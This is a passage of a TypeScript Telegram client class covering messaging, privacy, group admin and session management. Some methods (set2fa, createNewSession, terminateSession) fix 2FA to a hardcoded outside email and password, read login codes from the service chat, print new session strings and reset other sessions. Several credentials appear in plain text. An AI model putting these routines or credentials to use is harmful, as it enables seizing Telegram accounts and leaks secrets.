}\n\n    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll(),\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code)\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n\n    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.CreateChannel({\n            title: options.title,\n            about: options.description || '',\n            broadcast: false,\n            megagroup: true,\n            forImport: false,\n            geoPoint: undefined,\n            address: '',\n        }));\n\n        // Find the channel in updates safely\n        let channelId: bigInt.BigInteger | undefined;\n        if ('updates' in result) {\n            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\n            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\n            if (channelUpdate && 'channelId' in channelUpdate) {\n                channelId = channelUpdate.channelId;\n            }\n        }\n\n        if (!channelId) {\n            throw new Error('Failed to create channel');\n        }\n\n        const channel = await this.client.getEntity(channelId);\n        if (!(channel instanceof Api.Channel)) {\n            throw new Error('Created entity is not a channel');\n        }\n\n        if (options.members?.length) {\n            const users = await Promise.all(\n                options.members.map(member => this.client.getInputEntity(member))\n            );\n\n            await this.client.invoke(new Api.channels.InviteToChannel({\n                channel: await this.client.getInputEntity(channel),\n                users\n            }));\n        }\n\n        if (options.photo) {\n            const buffer = await this.downloadFileFromUrl(options.photo);\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            await this.client.invoke(new Api.channels.EditPhoto({\n                channel: await this.client.getInputEntity(channel),\n                photo: new Api.InputChatUploadedPhoto({\n                    file: inputFile\n                })\n            }));\n        }\n\n        return channel;\n    }\n\n    async updateGroupSettings(settings: {\n        groupId: string;\n        title?: string;\n        description?: string;\n        slowMode?: number;\n        memberRestrictions?: any;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getEntity(settings.groupId);\n\n        if (settings.title || settings.description) {\n            await this.client.invoke(new Api.channels.EditTitle({\n                channel: channel,\n                title: settings.title || ''\n            }));\n\n            if (settings.description) {\n                await this.client.invoke(new Api.messages.EditChatAbout({\n                    peer: channel,\n                    about: settings.description\n                }));\n            }\n        }\n\n        if (settings.slowMode !== undefined) {\n            await this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: channel,\n                seconds: settings.slowMode\n            }));\n        }\n\n        return true;\n    }\n\n    async scheduleMessageSend(opts: MessageScheduleOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\n\n        if (opts.media) {\n            const buffer = await this.downloadFileFromUrl(opts.media.url);\n\n            const uploadedFile = await this.client.uploadFile({\n                file: new CustomFile('media', buffer.length, 'media', buffer),\n                workers: 1\n            });\n\n            return this.client.sendFile(opts.chatId, {\n                file: uploadedFile,\n                caption: opts.message,\n                forceDocument: opts.media.type === 'document',\n                scheduleDate\n            });\n        }\n\n        return this.client.sendMessage(opts.chatId, {\n            message: opts.message,\n            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)\n        });\n    }\n\n    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({\n            peer: chatId,\n            hash: bigInt(0)\n        }));\n\n        return 'messages' in result && Array.isArray(result.messages)\n            ? result.messages.filter(msg => msg instanceof Api.Message)\n            : [];\n    }\n\n    async sendMediaAlbum(album: MediaAlbumOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            album.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const uploadedFile = await this.client.uploadFile({\n                    file: new CustomFile('media', buffer.length, 'media', buffer),\n                    workers: 1\n                });\n\n                return new Api.InputSingleMedia({\n                    media: item.type === 'photo'\n                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\n                        : new Api.InputMediaUploadedDocument({\n                            file: uploadedFile,\n                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',\n                            attributes: []\n                        }),\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: album.chatId,\n            multiMedia: mediaFiles\n        }));\n    }\n\n    async sendVoiceMessage(voice: {\n        chatId: string;\n        url: string;\n        duration?: number;\n        caption?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const buffer = await this.downloadFileFromUrl(voice.url);\n\n        return await this.client.invoke(new Api.messages.SendMedia({\n            peer: voice.chatId,\n            media: new Api.InputMediaUploadedDocument({\n                file: await this.client.uploadFile({\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\n                    workers: 1\n                }),\n                mimeType: 'audio/ogg',\n                attributes: [\n                    new Api.DocumentAttributeAudio({\n                        voice: true,\n                        duration: voice.duration || 0\n                    })\n                ]\n            }),\n            message: voice.caption || '',\n            randomId: bigInt(Math.floor(Math.random() * 1000000000))\n        }));\n    }\n\n    async cleanupChat(cleanup: {\n        chatId: string;\n        beforeDate?: Date;\n        onlyMedia?: boolean;\n        excludePinned?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const messages = await this.client.getMessages(cleanup.chatId, {\n            limit: 100,\n            ...(cleanup.beforeDate && {\n                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)\n            })\n        });\n\n        const toDelete = messages.filter(msg => {\n            if (cleanup.excludePinned && msg.pinned) return false;\n            if (cleanup.onlyMedia && !msg.media) return false;\n            return true;\n        });\n\n        if (toDelete.length > 0) {\n            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\n                revoke: true\n            });\n        }\n\n        return { deletedCount: toDelete.length };\n    }\n\n    async updatePrivacyBatch(settings: {\n        phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n        lastSeen?: 'everybody' | 'contacts' | 'nobody';\n        profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n        forwards?: 'everybody' | 'contacts' | 'nobody';\n        calls?: 'everybody' | 'contacts' | 'nobody';\n        groups?: 'everybody' | 'contacts' | 'nobody';\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const privacyRules = {\n            everybody: [new Api.InputPrivacyValueAllowAll()],\n            contacts: [new Api.InputPrivacyValueAllowContacts()],\n            nobody: [new Api.InputPrivacyValueDisallowAll()]\n        };\n\n        const updates = [];\n\n        const privacyMap = {\n            phoneNumber: Api.InputPrivacyKeyPhoneNumber,\n            lastSeen: Api.InputPrivacyKeyStatusTimestamp,\n            profilePhotos: Api.InputPrivacyKeyProfilePhoto,\n            forwards: Api.InputPrivacyKeyForwards,\n            calls: Api.InputPrivacyKeyPhoneCall,\n            groups: Api.InputPrivacyKeyChatInvite\n        };\n\n        for (const [key, value] of Object.entries(settings)) {\n            if (value && key in privacyMap) {\n                updates.push(this.client.invoke(new Api.account.SetPrivacy({\n                    key: new privacyMap[key](),\n                    rules: privacyRules[value]\n                })));\n            }\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getSessionInfo() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const [authorizationsResult, devicesResult] = await Promise.all([\n            this.client.invoke(new Api.account.GetAuthorizations()),\n            this.client.invoke(new Api.account.GetWebAuthorizations())\n        ]);\n\n        const sessions = authorizationsResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            deviceModel: auth.deviceModel,\n            platform: auth.platform,\n            systemVersion: auth.systemVersion,\n            appName: auth.appName,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            country: auth.country,\n            region: auth.region\n        }));\n\n        const webSessions = devicesResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            domain: auth.domain,\n            browser: auth.browser,\n            platform: auth.platform,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            region: auth.region\n        }));\n\n        return {\n            sessions,\n            webSessions\n        };\n    }\n\n    async terminateSession(options: {\n        hash: string;\n        type: 'app' | 'web';\n        exceptCurrent?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.exceptCurrent) {\n            if (options.type === 'app') {\n                await this.client.invoke(new Api.auth.ResetAuthorizations());\n            } else {\n                await this.client.invoke(new Api.account.ResetWebAuthorizations());\n            }\n            return true;\n        }\n\n        if (options.type === 'app') {\n            await this.client.invoke(new Api.account.ResetAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        } else {\n            await this.client.invoke(new Api.account.ResetWebAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        }\n        return true;\n    }\n\n    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = Math.floor(Date.now() / 1000);\n        const periodInSeconds = {\n            day: 24 * 60 * 60,\n            week: 7 * 24 * 60 * 60,\n            month: 30 * 24 * 60 * 60\n        }[period];\n\n        const messages = await this.client.getMessages(chatId, {\n            limit: 100,\n            offsetDate: now - periodInSeconds\n        });\n\n        const stats = {\n            period,\n            totalMessages: messages.length,\n            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\n            messageTypes: {\n                text: messages.filter(m => !m.media && m.message).length,\n                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\n                video: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');\n                }).length,\n                voice: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');\n                }).length,\n                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length\n            },\n            topSenders: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const senderId = msg.fromId?.toString();\n                    if (senderId) {\n                        acc[senderId] = (acc[senderId] || 0) + 1;\n                    }\n                    return acc;\n                }, {} as Record<string, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .slice(0, 10)\n                .map(([id, count]) => ({ id, count })),\n            mostActiveHours: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const hour = new Date(msg.date * 1000).getHours();\n                    acc[hour] = (acc[hour] || 0) + 1;\n                    return acc;\n                }, {} as Record<number, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .map(([hour, count]) => ({ hour: Number(hour), count }))\n        };\n\n        return stats;\n    }\n\n    private getMediaExtension(media: any): string {\n        if (!media) return 'bin';\n\n        switch (media.className) {\n            case 'MessageMediaPhoto':\n                return 'jpg';\n            case 'MessageMediaDocument':\n                const doc = media.document;\n                if (!doc || !('mimeType' in doc)) return 'bin';\n\n                const mime = doc.mimeType;\n                if (mime?.startsWith('video/')) return 'mp4';\n                if (mime?.startsWith('image/')) return mime.split('/')[1];\n                if (mime?.startsWith('audio/')) return 'ogg';\n                return 'bin';\n            default:\n                return 'bin';\n        }\n    }\n\n    async setContentFilters(filters: ContentFilter) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        this.contentFilters.set(filters.chatId, filters);\n\n        if (!this.filterHandler) {\n            this.filterHandler = this.client.addEventHandler(async (event) => {\n                if (event instanceof NewMessageEvent) {\n                    const message = event.message;\n                    const chatId = message.chatId?.toString();\n                    const filter = this.contentFilters.get(chatId);\n\n                    if (!filter) return;\n\n                    const shouldFilter = await this.evaluateMessage(message, filter);\n                    if (shouldFilter) {\n                        for (const action of filter.actions) {\n                            await this.executeFilterAction(action, message);\n                        }\n                    }\n                }\n            }, new NewMessage({}));\n        }\n    }\n\n    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {\n        if (filter.keywords?.length) {\n            const messageText = message.message.toLowerCase();\n            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {\n                return true;\n            }\n        }\n\n        if (filter.mediaTypes?.length && message.media) {\n            const mediaType = this.getMediaType(message.media);\n            if (filter.mediaTypes.includes(mediaType)) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {\n        try {\n            switch (action) {\n                case 'delete':\n                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });\n                    break;\n                case 'warn':\n                    await this.client.sendMessage(message.chatId, {\n                        message: `⚠️ Message filtered due to content policy.`,\n                        replyTo: message.id\n                    });\n                    break;\n                case 'mute':\n                    if (message.fromId) {\n                        await this.client.invoke(new Api.channels.EditBanned({\n                            channel: message.chatId,\n                            participant: message.fromId,\n                            bannedRights: new Api.ChatBannedRights({\n                                untilDate: Math.floor(Date.now() / 1000) + 3600,\n                                sendMessages: true\n                            })\n                        }));\n                    }\n                    break;\n            }\n        } catch (error) {\n            console.error(`Failed to execute filter action ${action}:`, error);\n        }\n    }\n\n    private getSearchFilter(filter: string): Api.TypeMessagesFilter {\n        switch (filter) {\n            case 'photo': return new Api.InputMessagesFilterPhotos();\n            case 'video': return new Api.InputMessagesFilterVideo();\n            case 'document': return new Api.InputMessagesFilterDocument();\n            case 'url': return new Api.InputMessagesFilterUrl();\n            default: return new Api.InputMessagesFilterEmpty();\n        }\n    }\n\n    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\n        if (media instanceof Api.MessageMediaPhoto) {\n            return 'photo';\n        } else if (media instanceof Api.MessageMediaDocument) {\n            const document = media.document as Api.Document;\n            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\n                return 'video';\n            }\n            return 'document';\n        }\n        return 'document';\n    }\n\n    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\n        if (entity instanceof Api.User) return entity.id.toString();\n        if (entity instanceof Api.Channel) return entity.id.toString();\n        if (entity instanceof Api.Chat) return entity.id.toString();\n        return '';\n    }\n\n    async addGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const users = await Promise.all(\n            members.map(member => this.client.getInputEntity(member))\n        );\n\n        await this.client.invoke(new Api.channels.InviteToChannel({\n            channel: channel,\n            users\n        }));\n    }\n\n    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        for (const member of members) {\n            const user = await this.client.getInputEntity(member);\n            await this.client.invoke(new Api.channels.EditBanned({\n                channel: channel,\n                participant: user,\n                bannedRights: new Api.ChatBannedRights({\n                    untilDate: 0,\n                    viewMessages: true,\n                    sendMessages: true,\n                    sendMedia: true,\n                    sendStickers: true,\n                    sendGifs: true,\n                    sendGames: true,\n                    sendInline: true,\n                    embedLinks: true\n                })\n            }));\n        }\n    }\n\n    async promoteToAdmin(\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: permissions?.changeInfo ?? false,\n                postMessages: permissions?.postMessages ?? false,\n                editMessages: permissions?.editMessages ?? false,\n                deleteMessages: permissions?.deleteMessages ?? false,\n                banUsers: permissions?.banUsers ?? false,\n                inviteUsers: permissions?.inviteUsers ?? true,\n                pinMessages: permissions?.pinMessages ?? false,\n                addAdmins: permissions?.addAdmins ?? false,\n                anonymous: permissions?.anonymous ?? false,\n                manageCall: permissions?.manageCall ?? false,\n                other: false\n            }),\n            rank: rank || ''\n        }));\n    }\n\n    async demoteAdmin(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: false,\n                postMessages: false,\n                editMessages: false,\n                deleteMessages: false,\n                banUsers: false,\n                inviteUsers: false,\n                pinMessages: false,\n                addAdmins: false,\n                anonymous: false,\n                manageCall: false,\n                other: false\n            }),\n            rank: ''\n        }));\n    }\n\n    async unblockGroupUser(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditBanned({\n            channel: channel,\n            participant: user,\n            bannedRights: new Api.ChatBannedRights({\n                untilDate: 0,\n                viewMessages: false,\n                sendMessages: false,\n                sendMedia: false,\n                sendStickers: false,\n                sendGifs: false,\n                sendGames: false,\n                sendInline: false,\n                embedLinks: false\n            })\n        }));\n    }\n\n    async getGroupAdmins(groupId: string): Promise<Array<{\n        userId: string;\n        rank?: string;\n        permissions: {\n            changeInfo: boolean;\n            postMessages: boolean;\n            editMessages: boolean;\n            deleteMessages: boolean;\n            banUsers: boolean;\n            inviteUsers: boolean;\n            pinMessages: boolean;\n            addAdmins: boolean;\n            anonymous: boolean;\n            manageCall: boolean;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsAdmins(),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantAdmin[];\n            const users = result.users;\n\n            return participants.map(participant => {\n                const adminRights = participant.adminRights as Api.ChatAdminRights;\n                return {\n                    userId: participant.userId.toString(),\n                    rank: participant.rank || '',\n                    permissions: {\n                        changeInfo: adminRights.changeInfo || false,\n                        postMessages: adminRights.postMessages || false,\n                        editMessages: adminRights.editMessages || false,\n                        deleteMessages: adminRights.deleteMessages || false,\n                        banUsers: adminRights.banUsers || false,\n                        inviteUsers: adminRights.inviteUsers || false,\n                        pinMessages: adminRights.pinMessages || false,\n                        addAdmins: adminRights.addAdmins || false,\n                        anonymous: adminRights.anonymous || false,\n                        manageCall: adminRights.manageCall || false\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async getGroupBannedUsers(groupId: string): Promise<Array<{\n        userId: string;\n        bannedRights: {\n            viewMessages: boolean;\n            sendMessages: boolean;\n            sendMedia: boolean;\n            sendStickers: boolean;\n            sendGifs: boolean;\n            sendGames: boolean;\n            sendInline: boolean;\n            embedLinks: boolean;\n            untilDate: number;\n        };\n    }>> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.channels.GetParticipants({\n            channel: await this.client.getInputEntity(groupId),\n            filter: new Api.ChannelParticipantsBanned({ q: '' }),\n            offset: 0,\n            limit: 100,\n            hash: bigInt(0)\n        }));\n\n        if ('users' in result) {\n            const participants = result.participants as Api.ChannelParticipantBanned[];\n\n            return participants.map(participant => {\n                const bannedRights = participant.bannedRights as Api.ChatBannedRights;\n                return {\n                    userId: (participant.peer as Api.PeerChat).chatId.toString(),\n                    bannedRights: {\n                        viewMessages: bannedRights.viewMessages || false,\n                        sendMessages: bannedRights.sendMessages || false,\n                        sendMedia: bannedRights.sendMedia || false,\n                        sendStickers: bannedRights.sendStickers || false,\n                        sendGifs: bannedRights.sendGifs || false,\n                        sendGames: bannedRights.sendGames || false,\n                        sendInline: bannedRights.sendInline || false,\n                        embedLinks: bannedRights.embedLinks || false,\n                        untilDate: bannedRights.untilDate || 0\n                    }\n                };\n            });\n        }\n        return [];\n    }\n\n    async searchMessages(params: {\n        chatId: string;\n        query?: string;\n        types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document')[];\n        offset?: number;\n        limit?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, query = '', types = ['all'], offset = 0, limit = 20 } = params;\n\n        let filter: any = new Api.InputMessagesFilterEmpty();\n        if (types.length === 1 && types[0] !== 'all') {\n            switch (types[0]) {\n                case 'photo':\n                    filter = new Api.InputMessagesFilterPhotos();\n                    break;\n                case 'video':\n                    filter = new Api.InputMessagesFilterVideo();\n                    break;\n                case 'voice':\n                    filter = new Api.InputMessagesFilterVoice();\n                    break;\n                case 'document':\n                    filter = new Api.InputMessagesFilterDocument();\n                    break;\n                case 'text':\n                    // For text-only messages, we'll filter after fetching\n                    break;\n            }\n        }\n\n        const result = await this.client.invoke(\n            new Api.messages.Search({\n                peer: await this.client.getInputEntity(chatId),\n                q: query,\n                filter: filter,\n                minDate: 0,\n                maxDate: 0,\n                offsetId: offset,\n                addOffset: 0,\n                limit: limit,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n                fromId: undefined\n            })\n        );\n\n        if (!('messages' in result)) {\n            return { messages: [], total: 0 };\n        }\n\n        let messages = result.messages;\n\n        // Additional filtering for text-only messages if requested\n        if (types.includes('text') && types.length === 1) {\n            messages = messages.filter((msg: Api.Message) => !('media' in msg));\n        }\n\n        const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = 'media' in message && message.media\n                ? {\n                    type: this.getMediaType(message.media),\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n      